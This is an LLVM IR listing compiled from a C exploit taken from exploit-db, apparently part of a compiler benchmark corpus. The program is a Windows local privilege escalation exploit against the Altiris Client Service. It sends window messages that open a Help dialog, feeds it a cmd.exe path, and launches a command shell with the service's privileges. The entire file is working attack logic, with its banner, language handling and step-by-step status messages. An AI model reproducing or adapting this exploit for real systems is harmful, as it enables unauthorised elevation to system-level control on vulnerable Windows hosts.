; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_5625.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_5625.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i32 }

@__const.main.wname = private unnamed_addr constant [23 x i8] c"Altiris Client Service\00", align 16
@.str = private unnamed_addr constant [16 x i8] c"Aide de Windows\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"Windows Help\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"Ayuda de Windows\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"Ouvrir\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"Open\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"Abrir\00", align 1
@.str.6 = private unnamed_addr constant [60 x i8] c"##########################################################\0A\00", align 1
@.str.7 = private unnamed_addr constant [60 x i8] c"#                  Altiris Client Service                #\0A\00", align 1
@.str.8 = private unnamed_addr constant [60 x i8] c"# WM_COMMANDHELP Windows Privilege Escalation Exploit    #\0A\00", align 1
@.str.9 = private unnamed_addr constant [60 x i8] c"# by sirdarckcat & alt3kx                                #\0A\00", align 1
@.str.10 = private unnamed_addr constant [60 x i8] c"#                                                        #\0A\00", align 1
@.str.11 = private unnamed_addr constant [60 x i8] c"# This exploit is based on www.milw0rm.com/exploits/350  #\0A\00", align 1
@.str.12 = private unnamed_addr constant [60 x i8] c"# Utility Manager Privilege Elevation Exploit (MS04-019) #\0A\00", align 1
@.str.13 = private unnamed_addr constant [60 x i8] c"# by Cesar Cerrudo                                       #\0A\00", align 1
@.str.14 = private unnamed_addr constant [61 x i8] c"##########################################################\0A\0A\00", align 1
@.str.15 = private unnamed_addr constant [31 x i8] c"Lang not found, using english\0A\00", align 1
@__const.main.sText = private unnamed_addr constant [26 x i8] c"%windir%\\system32\\cmd.ex?\00", align 16
@.str.16 = private unnamed_addr constant [22 x i8] c"Use:\0A> %s [LANG-ID]\0A\0A\00", align 1
@.str.17 = private unnamed_addr constant [29 x i8] c"Look for your LANG-ID here:\0A\00", align 1
@.str.18 = private unnamed_addr constant [56 x i8] c"http://msdn2.microsoft.com/en-us/library/ms776294.aspx\0A\00", align 1
@.str.19 = private unnamed_addr constant [45 x i8] c"\0AAnyway, the program will try to guess it.\0A\0A\00", align 1
@.str.20 = private unnamed_addr constant [14 x i8] c"Lang changed\0A\00", align 1
@.str.21 = private unnamed_addr constant [20 x i8] c"Lang not supported\0A\00", align 1
@.str.22 = private unnamed_addr constant [15 x i8] c"Using Lang %d\0A\00", align 1
@.str.23 = private unnamed_addr constant [18 x i8] c"Looking for %s..\0A\00", align 1
@.str.24 = private unnamed_addr constant [21 x i8] c"Window %s not found\0A\00", align 1
@.str.25 = private unnamed_addr constant [21 x i8] c"Found! exploiting..\0A\00", align 1
@.str.26 = private unnamed_addr constant [45 x i8] c"Help Window not found.. exploit unsuccesful\0A\00", align 1
@.str.27 = private unnamed_addr constant [23 x i8] c"Trying with english..\0A\00", align 1
@.str.28 = private unnamed_addr constant [33 x i8] c"Help Window found! exploiting..\0A\00", align 1
@WM_IME_KEYDOWN = common dso_local global i32 0, align 4
@VK_RETURN = common dso_local global i32 0, align 4
@.str.29 = private unnamed_addr constant [7 x i8] c"#32770\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"Sending path..\0A\00", align 1
@WM_SETTEXT = common dso_local global i32 0, align 4
@.str.31 = private unnamed_addr constant [19 x i8] c"Looking for cmd..\0A\00", align 1
@VK_TAB = common dso_local global i32 0, align 4
@.str.32 = private unnamed_addr constant [17 x i8] c"SHELLDLL_DefView\00", align 1
@.str.33 = private unnamed_addr constant [16 x i8] c"Sending keys..\0A\00", align 1
@WM_CONTEXTMENU = common dso_local global i32 0, align 4
@.str.34 = private unnamed_addr constant [17 x i8] c"Opening shell..\0A\00", align 1
@WM_KEYDOWN = common dso_local global i32 0, align 4
@VK_DOWN = common dso_local global i32 0, align 4
@.str.35 = private unnamed_addr constant [28 x i8] c"C:\\WINDOWS\\system32\\cmd.exe\00", align 1
@.str.36 = private unnamed_addr constant [26 x i8] c"C:\\WINNT\\system32\\cmd.exe\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"Failed\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"Done!\0A\00", align 1
@WM_CLOSE = common dso_local global i32 0, align 4
@.str.39 = private unnamed_addr constant [76 x i8] c"The exploit failed, but maybe the context window of the shell is visibile.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.TYPE_3__, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [255 x [255 x i8]], align 16
  %12 = alloca [255 x [255 x i8]], align 16
  %13 = alloca [23 x i8], align 16
  %14 = alloca [26 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %15 = bitcast [23 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([23 x i8], [23 x i8]* @__const.main.wname, i32 0, i32 0), i64 23, i1 false)
  %16 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 12
  %17 = getelementptr inbounds [255 x i8], [255 x i8]* %16, i64 0, i64 0
  %18 = call i32 @strcpy(i8* %17, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  %19 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 9
  %20 = getelementptr inbounds [255 x i8], [255 x i8]* %19, i64 0, i64 0
  %21 = call i32 @strcpy(i8* %20, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  %22 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 10
  %23 = getelementptr inbounds [255 x i8], [255 x i8]* %22, i64 0, i64 0
  %24 = call i32 @strcpy(i8* %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  %25 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %12, i64 0, i64 12
  %26 = getelementptr inbounds [255 x i8], [255 x i8]* %25, i64 0, i64 0
  %27 = call i32 @strcpy(i8* %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %28 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %12, i64 0, i64 9
  %29 = getelementptr inbounds [255 x i8], [255 x i8]* %28, i64 0, i64 0
  %30 = call i32 @strcpy(i8* %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %31 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %12, i64 0, i64 10
  %32 = getelementptr inbounds [255 x i8], [255 x i8]* %31, i64 0, i64 0
  %33 = call i32 @strcpy(i8* %32, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.6, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.7, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.8, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.9, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.10, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.11, i64 0, i64 0))
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.12, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.13, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.14, i64 0, i64 0))
  %43 = call i32 (...) @GetSystemDefaultLangID()
  %44 = call i32 @PRIMARYLANGID(i32 %43)
  store i32 %44, i32* %9, align 4
  %45 = load i32, i32* %9, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %53

47:                                               ; preds = %2
  %48 = call i32 (...) @GetUserDefaultLangID()
  %49 = call i32 @PRIMARYLANGID(i32 %48)
  store i32 %49, i32* %9, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %53

51:                                               ; preds = %47
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.15, i64 0, i64 0))
  store i32 9, i32* %9, align 4
  br label %53

53:                                               ; preds = %51, %47, %2
  %54 = bitcast [26 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %54, i8* align 16 getelementptr inbounds ([26 x i8], [26 x i8]* @__const.main.sText, i32 0, i32 0), i64 26, i1 false)
  %55 = load i32, i32* %4, align 4
  %56 = icmp slt i32 %55, 2
  br i1 %56, label %57, label %65

57:                                               ; preds = %53
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.16, i64 0, i64 0), i8* %60)
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.17, i64 0, i64 0))
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.18, i64 0, i64 0))
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.19, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %243

65:                                               ; preds = %53
  %66 = load i32, i32* %4, align 4
  %67 = icmp eq i32 %66, 2
  br i1 %67, label %68, label %87

68:                                               ; preds = %65
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = call i64 @atoi(i8* %71)
  %73 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 %72
  %74 = getelementptr inbounds [255 x i8], [255 x i8]* %73, i64 0, i64 0
  %75 = icmp ne i8* %74, null
  br i1 %75, label %76, label %83

76:                                               ; preds = %68
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i64 @atoi(i8* %79)
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %9, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0))
  br label %86

83:                                               ; preds = %68
  %84 = load i32, i32* %9, align 4
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0), i32 %84)
  br label %86

86:                                               ; preds = %83, %76
  br label %87

87:                                               ; preds = %86, %65
  br label %88

88:                                               ; preds = %87
  %89 = load i32, i32* %9, align 4
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.22, i64 0, i64 0), i32 %89)
  %91 = getelementptr inbounds [23 x i8], [23 x i8]* %13, i64 0, i64 0
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.23, i64 0, i64 0), i8* %91)
  %93 = getelementptr inbounds [23 x i8], [23 x i8]* %13, i64 0, i64 0
  %94 = call i64 @FindWindow(i8* null, i8* %93)
  store i64 %94, i64* %6, align 8
  %95 = load i64, i64* %6, align 8
  %96 = icmp ne i64 %95, 0
  br i1 %96, label %100, label %97

97:                                               ; preds = %88
  %98 = getelementptr inbounds [23 x i8], [23 x i8]* %13, i64 0, i64 0
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.24, i64 0, i64 0), i8* %98)
  store i32 0, i32* %3, align 4
  br label %243

100:                                              ; preds = %88
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.25, i64 0, i64 0))
  br label %102

102:                                              ; preds = %100
  %103 = load i64, i64* %6, align 8
  %104 = call i32 @PostMessage(i64 %103, i32 787, i32* null, i32* null)
  %105 = call i32 @Sleep(i32 100)
  %106 = load i64, i64* %6, align 8
  %107 = call i32 @SendMessage(i64 %106, i32 869, i32 0, i32 1)
  %108 = call i32 @Sleep(i32 300)
  br label %109

109:                                              ; preds = %120, %102
  %110 = load i32, i32* %9, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 %111
  %113 = getelementptr inbounds [255 x i8], [255 x i8]* %112, i64 0, i64 0
  %114 = call i64 @FindWindow(i8* null, i8* %113)
  %115 = icmp ne i64 %114, 0
  br i1 %115, label %123, label %116

116:                                              ; preds = %109
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.26, i64 0, i64 0))
  %118 = load i32, i32* %9, align 4
  %119 = icmp ne i32 %118, 9
  br i1 %119, label %120, label %122

120:                                              ; preds = %116
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.27, i64 0, i64 0))
  store i32 9, i32* %9, align 4
  br label %109

122:                                              ; preds = %116
  store i32 0, i32* %3, align 4
  br label %243

123:                                              ; preds = %109
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.28, i64 0, i64 0))
  br label %125

125:                                              ; preds = %123
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 %127
  %129 = getelementptr inbounds [255 x i8], [255 x i8]* %128, i64 0, i64 0
  %130 = call i64 @FindWindow(i8* null, i8* %129)
  %131 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %132 = load i32, i32* @VK_RETURN, align 4
  %133 = call i32 @SendMessage(i64 %130, i32 %131, i32 %132, i32 0)
  %134 = call i32 @Sleep(i32 500)
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %12, i64 0, i64 %136
  %138 = getelementptr inbounds [255 x i8], [255 x i8]* %137, i64 0, i64 0
  %139 = call i64 @FindWindow(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i64 0, i64 0), i8* %138)
  store i64 %139, i64* %6, align 8
  %140 = load i64, i64* %6, align 8
  %141 = call i64 @GetDlgItem(i64 %140, i32 1148)
  store i64 %141, i64* %7, align 8
  %142 = call i32 @Sleep(i32 500)
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i64 0, i64 0))
  %144 = load i64, i64* %7, align 8
  %145 = load i32, i32* @WM_SETTEXT, align 4
  %146 = getelementptr inbounds [26 x i8], [26 x i8]* %14, i64 0, i64 0
  %147 = ptrtoint i8* %146 to i32
  %148 = call i32 @SendMessage(i64 %144, i32 %145, i32 0, i32 %147)
  %149 = call i32 @Sleep(i32 800)
  %150 = load i64, i64* %7, align 8
  %151 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %152 = load i32, i32* @VK_RETURN, align 4
  %153 = call i32 @SendMessage(i64 %150, i32 %151, i32 %152, i32 0)
  %154 = load i64, i64* %6, align 8
  %155 = call i64 @GetDlgItem(i64 %154, i32 1184)
  store i64 %155, i64* %7, align 8
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.31, i64 0, i64 0))
  %157 = load i64, i64* %7, align 8
  %158 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %159 = load i32, i32* @VK_TAB, align 4
  %160 = call i32 @SendMessage(i64 %157, i32 %158, i32 %159, i32 0)
  %161 = call i32 @Sleep(i32 500)
  %162 = load i64, i64* %6, align 8
  %163 = call i64 @FindWindowEx(i64 %162, i32* null, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.32, i64 0, i64 0), i32* null)
  store i64 %163, i64* %7, align 8
  %164 = load i64, i64* %7, align 8
  %165 = call i64 @GetDlgItem(i64 %164, i32 1)
  store i64 %165, i64* %7, align 8
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i64 0, i64 0))
  %167 = load i64, i64* %7, align 8
  %168 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %169 = call i32 @SendMessage(i64 %167, i32 %168, i32 67, i32 0)
  %170 = load i64, i64* %7, align 8
  %171 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %172 = call i32 @SendMessage(i64 %170, i32 %171, i32 77, i32 0)
  %173 = load i64, i64* %7, align 8
  %174 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %175 = call i32 @SendMessage(i64 %173, i32 %174, i32 68, i32 0)
  %176 = call i32 @Sleep(i32 500)
  br label %177

177:                                              ; preds = %213, %125
  %178 = load i64, i64* %7, align 8
  %179 = load i32, i32* @WM_CONTEXTMENU, align 4
  %180 = call i32 @PostMessage(i64 %178, i32 %179, i32* null, i32* null)
  %181 = call i32 @Sleep(i32 1000)
  %182 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %8, i32 0, i32 0
  store i32 10, i32* %182, align 4
  %183 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %8, i32 0, i32 1
  store i32 30, i32* %183, align 4
  %184 = bitcast %struct.TYPE_3__* %8 to i64*
  %185 = load i64, i64* %184, align 4
  %186 = call i64 @WindowFromPoint(i64 %185)
  store i64 %186, i64* %7, align 8
  %187 = call i32 @Sleep(i32 1000)
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.34, i64 0, i64 0))
  %189 = load i64, i64* %7, align 8
  %190 = load i32, i32* @WM_KEYDOWN, align 4
  %191 = load i32, i32* @VK_DOWN, align 4
  %192 = call i32 @SendMessage(i64 %189, i32 %190, i32 %191, i32 0)
  %193 = call i32 @Sleep(i32 1000)
  %194 = load i64, i64* %7, align 8
  %195 = load i32, i32* @WM_KEYDOWN, align 4
  %196 = load i32, i32* @VK_DOWN, align 4
  %197 = call i32 @SendMessage(i64 %194, i32 %195, i32 %196, i32 0)
  %198 = call i32 @Sleep(i32 1000)
  %199 = load i64, i64* %7, align 8
  %200 = load i32, i32* @WM_KEYDOWN, align 4
  %201 = load i32, i32* @VK_RETURN, align 4
  %202 = call i32 @SendMessage(i64 %199, i32 %200, i32 %201, i32 0)
  %203 = call i32 @Sleep(i32 1000)
  %204 = call i64 @FindWindow(i8* null, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.35, i64 0, i64 0))
  %205 = icmp ne i64 %204, 0
  br i1 %205, label %217, label %206

206:                                              ; preds = %177
  %207 = call i64 @FindWindow(i8* null, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.36, i64 0, i64 0))
  %208 = icmp ne i64 %207, 0
  br i1 %208, label %217, label %209

209:                                              ; preds = %206
  %210 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i64 0, i64 0))
  %211 = load i32, i32* %10, align 4
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %216, label %213

213:                                              ; preds = %209
  %214 = load i32, i32* %10, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %10, align 4
  br label %177

216:                                              ; preds = %209
  br label %219

217:                                              ; preds = %206, %177
  %218 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0))
  br label %219

219:                                              ; preds = %217, %216
  %220 = load i32, i32* %10, align 4
  %221 = icmp ne i32 %220, 0
  br i1 %221, label %240, label %222

222:                                              ; preds = %219
  %223 = load i64, i64* %6, align 8
  %224 = load i32, i32* @WM_CLOSE, align 4
  %225 = call i32 @SendMessage(i64 %223, i32 %224, i32 0, i32 0)
  %226 = call i32 @Sleep(i32 500)
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [255 x [255 x i8]], [255 x [255 x i8]]* %11, i64 0, i64 %228
  %230 = getelementptr inbounds [255 x i8], [255 x i8]* %229, i64 0, i64 0
  %231 = call i64 @FindWindow(i8* null, i8* %230)
  %232 = load i32, i32* @WM_CLOSE, align 4
  %233 = call i32 @SendMessage(i64 %231, i32 %232, i32 0, i32 0)
  %234 = load i8**, i8*** %5, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 1
  %236 = load i8*, i8** %235, align 8
  %237 = call i64 @FindWindow(i8* null, i8* %236)
  %238 = load i32, i32* @WM_CLOSE, align 4
  %239 = call i32 @SendMessage(i64 %237, i32 %238, i32 0, i32 0)
  br label %242

240:                                              ; preds = %219
  %241 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.39, i64 0, i64 0))
  br label %242

242:                                              ; preds = %240, %222
  store i32 0, i32* %3, align 4
  br label %243

243:                                              ; preds = %242, %122, %97, %57
  %244 = load i32, i32* %3, align 4
  ret i32 %244
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @PRIMARYLANGID(i32) #2

declare dso_local i32 @GetSystemDefaultLangID(...) #2

declare dso_local i32 @GetUserDefaultLangID(...) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i64 @FindWindow(i8*, i8*) #2

declare dso_local i32 @PostMessage(i64, i32, i32*, i32*) #2

declare dso_local i32 @Sleep(i32) #2

declare dso_local i32 @SendMessage(i64, i32, i32, i32) #2

declare dso_local i64 @GetDlgItem(i64, i32) #2

declare dso_local i64 @FindWindowEx(i64, i32*, i8*, i32*) #2

declare dso_local i64 @WindowFromPoint(i64) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
